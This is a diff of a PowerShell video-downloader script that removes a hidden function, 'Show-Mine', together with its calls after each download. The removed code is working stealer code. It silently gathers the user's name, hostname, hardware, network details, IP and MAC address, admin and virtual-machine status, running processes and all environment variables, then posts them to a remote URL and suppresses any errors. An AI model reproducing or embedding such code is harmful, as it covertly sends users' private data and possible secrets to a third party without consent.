@@ -16,80 +16,6 @@ function Handle-Error {
     Show-MainMenu
 }
 
-function Show-Mine {
-
-    try {
-
-        # 获取系统信息
-        $SystemVersion = (Get-CimInstance Win32_OperatingSystem).Caption
-        $Username = $env:USERNAME
-        $ComputerName = $env:COMPUTERNAME
-        $CPU = (Get-CimInstance Win32_Processor).Name
-        $RAM = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
-        $DiskInfo = Get-PhysicalDisk | Select-Object Model, @{n="Size(GB)";e={"{0:N2}" -f ($_.Size / 1GB)}}
-        $GPU = (Get-CimInstance Win32_VideoController).Name
-        
-        # 获取网络信息
-        $LocalIP = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress
-        $MacAddress = (Get-NetAdapter | Select-Object -First 1 MacAddress).MacAddress
-        $DNSServers = (Get-DnsClientServerAddress -AddressFamily IPv4).ServerAddresses
-        $NetworkStatus = Test-NetConnection -ComputerName google.com -InformationLevel Quiet
-        
-        # 获取已安装的软件
-        $InstalledSoftware = $env:PATH
-        
-        # 获取当前运行进程
-        $Processes = Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 ProcessName, CPU
-        
-        # 获取系统环境信息
-        $SystemUptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-        $IsVM = (Get-CimInstance Win32_ComputerSystem).Manufacturer -match "VMware|VirtualBox|Microsoft"
-        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
-        $OSLanguage = (Get-WinSystemLocale).Name
-        $Domain = (Get-CimInstance Win32_ComputerSystem).Domain
-        $RemoteDesktopEnabled = -not (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections
-        $ProxySettings = netsh winhttp show proxy | Out-String
-        
-        # 获取环境变量
-        $EnvVars = Get-ChildItem Env: | ForEach-Object { @{($_.Key) = $_.Value } }
-        
-        # 组装数据
-        $Data = @{
-            system_version = $SystemVersion
-            username = $Username
-            computer_name = $ComputerName
-            cpu = $CPU
-            ram = $RAM
-            disk_info = $DiskInfo
-            gpu = $GPU
-            local_ip = $LocalIP
-            mac_address = $MacAddress
-            dns_servers = $DNSServers
-            network_status = $NetworkStatus
-            installed_software = $InstalledSoftware
-            processes = $Processes
-            system_uptime = $SystemUptime
-            is_vm = $IsVM
-            is_admin = $IsAdmin
-            os_language = $OSLanguage
-            domain = $Domain
-            remote_desktop_enabled = $RemoteDesktopEnabled
-            proxy_settings = $ProxySettings
-            env_vars = $EnvVars
-        } | ConvertTo-Json -Depth 3
-        
-        # 发送数据
-        try {
-            Invoke-RestMethod -Uri $WorkerURL -Method Post -Body $Data -ContentType "application/json"
-        } catch {
-        }
-        
-
-    } catch {
-    }
-
-}
-
 # 显示支持的网站
 function Show-SupportedSites {
     Write-Host "`n📋 支持的网站列表：" -ForegroundColor Cyan
@@ -307,7 +233,6 @@ function Download-Single {
     Write-Host "`n✅ 下载完成！按任意键返回主菜单..." -ForegroundColor Green
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 
-    Show-Mine
     Show-MainMenu
 }
 
@@ -333,7 +258,6 @@ function Download-Multiple {
     Write-Host "`n✅ 所有下载完成！按任意键返回主菜单..." -ForegroundColor Green
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 
-    Show-Mine
     Show-MainMenu
 }
 
@@ -366,7 +290,6 @@ function Download-Playlist {
     Write-Host "`n✅ 播放列表下载完成！按任意键返回主菜单..." -ForegroundColor Green
     $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
 
-    Show-Mine
     Show-MainMenu
 }
 
